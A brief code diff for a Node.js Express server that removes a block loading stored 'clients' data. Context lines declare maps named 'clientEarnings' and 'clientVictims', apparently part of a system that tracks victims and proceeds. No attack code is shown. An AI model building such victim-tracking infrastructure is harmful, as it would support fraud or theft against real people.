@@ -4420,13 +4420,6 @@ app.get('/ping', (req, res) => {
   }
 }
 
-  try {
-      clients = new Map(data.clients || []);
-      console.log('📂 Loaded ' + clients.size + ' clients from storage');
-    }
-  } catch (error) {
-    console.log('No existing client data found or file corrupted');
-  }
 
 let clientEarnings = new Map();
 let clientVictims = new Map();
